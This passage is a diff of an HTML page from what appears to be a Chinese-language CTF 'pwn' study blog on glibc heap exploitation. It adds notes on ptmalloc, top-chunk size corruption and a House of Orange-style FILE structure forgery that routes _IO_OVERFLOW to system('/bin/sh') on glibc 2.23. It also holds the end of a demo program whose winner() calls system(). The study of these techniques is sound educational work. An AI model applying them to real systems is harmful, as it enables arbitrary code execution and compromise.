class="hljs-comment">/*</span><br><span class="hljs-comment">     The libc&#x27;s error message will be printed to the screen</span><br><span class="hljs-comment">     But you&#x27;ll get a shell anyways.</span><br><span class="hljs-comment">   */</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">winner</span><span class="hljs-params">(<span class="hljs-type">char</span> *ptr)</span><br>&#123; <br>    system(ptr);<br>    syscall(SYS_exit, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>相关机制：</p>
+<p>在 <code>malloc</code> 过程中，当从 Unsorted Bin 中获取一个块时，会调用 <code>unlink</code></p>
+<h3 id="ptmalloc机制"><a href="#ptmalloc机制" class="headerlink" title="ptmalloc机制"></a>ptmalloc机制</h3><p><img src="/pwn-notes/images/notes/image-20261125190132468.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125190132468"></p>
+<p>单链表（lifo）：后进先出</p>
+<p><img src="/pwn-notes/images/notes/image-20261125105056244.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125105056244"></p>
+<p>调试：“</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> sysctl -w kernel.yama.ptrace_scope=0<br></code></pre></td></tr></table></figure>
+
+<p>调试的时候加上-g参数，然后调试的时候就会看到代码</p>
+<p>首先申请一个堆块</p>
+<p><img src="/pwn-notes/images/notes/image-20261125150114614.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125150114614"></p>
+<p><img src="/pwn-notes/images/notes/image-20261125150302006.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125150302006"></p>
+<p>下面就是此时的top_chunk的大小</p>
+<p><img src="/pwn-notes/images/notes/image-20261125151005869.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125151005869"></p>
+<p>那个top就是指向这个的地方</p>
+<p><img src="/pwn-notes/images/notes/image-20261125151328166.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125151328166"></p>
+<p><img src="/pwn-notes/images/notes/image-20261125151133061.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125151133061"></p>
+<p>这个就是top1</p>
+<p>之后的话就是直接修改其大小</p>
+<p>（不能直接从top里面切，而是需要调用sysmalloc ）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">assert ((old_top == initial_top(av) &amp;&amp; old_size == <span class="hljs-number">0</span>) ||<br>        (old_size &gt;= MINSIZE &amp;&amp; prev_inuse(old_top) &amp;&amp;<br>         ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)old_end &amp; (pagesize - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>));<br></code></pre></td></tr></table></figure>
+
+<p><img src="/pwn-notes/images/notes/image-20261125190857619.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125190857619"></p>
+<p>这个时候以经将那个top_chunk的size字段改成了c01</p>
+<p><img src="/pwn-notes/images/notes/image-20261125191041827.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125191041827"></p>
+<p>申请x01000</p>
+<p>效果：</p>
+<p><img src="/pwn-notes/images/notes/image-20261125191120391.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125191120391"></p>
+<p>这是在泄露libc地址吗，这里其实是申请了0x1000</p>
+<p><img src="/pwn-notes/images/notes/image-20261125195731200.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125195731200"></p>
+<p>之后的top[3]就是bk指针</p>
+<p><img src="/pwn-notes/images/notes/image-20261125195959512.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125195959512"></p>
+<p><img src="/pwn-notes/images/notes/image-20261125200121599.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125200121599"></p>
+<p>之后的话，将相关字符串写入top的开头</p>
+<p><img src="/pwn-notes/images/notes/image-20261125201742610.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125201742610"></p>
+<p>之后又修改了topchunk的size大小</p>
+<p><img src="/pwn-notes/images/notes/image-20261125201814947.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125201814947"></p>
+<p><img src="/pwn-notes/images/notes/image-20261125201847173.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125201847173"></p>
+<p>之后</p>
+<p><img src="/pwn-notes/images/notes/image-20261125203126677.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125203126677"></p>
+<p><img src="/pwn-notes/images/notes/image-20261125203115043.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125203115043"></p>
+<p><img src="/pwn-notes/images/notes/image-20261125203733845.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261125203733845"></p>
+<p><img src="/pwn-notes/images/notes/image-20261126000422824.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261126000422824"></p>
+<p><img src="/pwn-notes/images/notes/image-20261126000444189.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261126000444189"></p>
+<p>也就是说这三个参数的设置就只是为了通过这个if检查，之后的话好进入_IO_OVERFLOW</p>
+<p>看懵了</p>
+<h3 id="FILE结构体"><a href="#FILE结构体" class="headerlink" title="FILE结构体"></a>FILE结构体</h3><table>
+<thead>
+<tr>
+<th align="left">字段</th>
+<th align="left">偏移</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>_flags</code></td>
+<td align="left">0x00</td>
+</tr>
+<tr>
+<td align="left"><code>_IO_read_ptr</code></td>
+<td align="left">0x08</td>
+</tr>
+<tr>
+<td align="left"><code>_IO_write_base</code></td>
+<td align="left">0x20</td>
+</tr>
+<tr>
+<td align="left"><code>_IO_write_ptr</code></td>
+<td align="left">0x28</td>
+</tr>
+<tr>
+<td align="left"><code>_chain</code></td>
+<td align="left">0x68</td>
+</tr>
+<tr>
+<td align="left"><code>_mode</code></td>
+<td align="left">0xc0</td>
+</tr>
+<tr>
+<td align="left"><code>vtable</code></td>
+<td align="left">0xd8</td>
+</tr>
+</tbody></table>
+<p><img src="/pwn-notes/images/notes/image-20261126000826368.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261126000826368"></p>
+<p>青色三行——决定成立后干什么。 _IO_OVERFLOW(fp, EOF) 实际是调用 fp-&gt;vtable-&gt;__overflow(fp, EOF)。2.23 不检查 vtable 指针，所以我们在堆上造一张假表，把 __overflow 那个槽填成 system。而第一个参数传的就是 fp 本身——所以把 “&#x2F;bin&#x2F;sh” 放在伪造 FILE 的开头，system(fp) 就变成了 system(“&#x2F;bin&#x2F;sh”)。_chain 则是让 _IO_list_all 那条链表能走到我们这块。</p>
+<h3 id="malloc-printerr"><a href="#malloc-printerr" class="headerlink" title="malloc_printerr"></a>malloc_printerr</h3><p><img src="/pwn-notes/images/notes/image-20261126001351918.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261126001351918"></p>
+<p>2.26 那个提交把这条链路拆掉了，<code>malloc_printerr</code> 不再触发 <code>_IO_flush_all_lockp</code></p>
+<p><img src="/pwn-notes/images/notes/image-20261126001548885.png" srcset="/pwn-notes/img/loading.gif" lazyload alt="image-20261126001548885"></p>
+<!-- sync-hash: 7e14e383a71d8d1529e982ec1874a476d1a417a3888b4973b2e3b697cc892d95 -->
 
                 
               </div>
@@ -1273,17 +1395,17 @@
       
         <a href="/pwn-notes/tags/unlink/" class="print-no-link">#unlink</a>
       
-        <a href="/pwn-notes/tags/fastbin/" class="print-no-link">#fastbin</a>
-      
         <a href="/pwn-notes/tags/unsorted-bin/" class="print-no-link">#unsorted-bin</a>
       
         <a href="/pwn-notes/tags/double-free/" class="print-no-link">#double-free</a>
       
+        <a href="/pwn-notes/tags/fastbin/" class="print-no-link">#fastbin</a>
+      
         <a href="/pwn-notes/tags/HouseOfSpirit/" class="print-no-link">#HouseOfSpirit</a>
       
-        <a href="/pwn-notes/tags/malloc-consolidate/" class="print-no-link">#malloc-consolidate</a>
+        <a href="/pwn-notes/tags/IO-FILE/" class="print-no-link">#IO-FILE</a>
       
-        <a href="/pwn-notes/tags/glibc2-35/" class="print-no-link">#glibc2.35</a>
+        <a href="/pwn-notes/tags/malloc-consolidate/" class="print-no-link">#malloc-consolidate</a>
       
     </div>
   
@@ -1296,7 +1418,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>HOW2HEAP</div>
-      <div>https://henan808.github.io/pwn-notes/2026/11/13/sync-typora-pwn-how2heap-c67585/</div>
+      <div>https://henan808.github.io/pwn-notes/2026/11/25/sync-typora-pwn-how2heap-c67585/</div>
     </div>
     <div class="license-meta">
       
@@ -1308,7 +1430,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2026年11月13日</div>
+          <div>2026年11月26日</div>
         </div>
       
       
@@ -1352,18 +1474,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/pwn-notes/2026/11/13/sync-typora-pwn-v-n2020-easytheap-8e50cf/" title="[V&amp;N2020 公开赛]easyTHeap（差一步美满）">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">[V&amp;N2020 公开赛]easyTHeap（差一步美满）</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/pwn-notes/2026/11/13/sync-typora-pwn-1-uaf-a9fd52/" title="1.UAF">
-                        <span class="hidden-mobile">1.UAF</span>
+                      <a href="/pwn-notes/2026/11/25/sync-typora-pwn-528b35dc-1f2e3a/" title="挑战赛">
+                        <span class="hidden-mobile">挑战赛</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
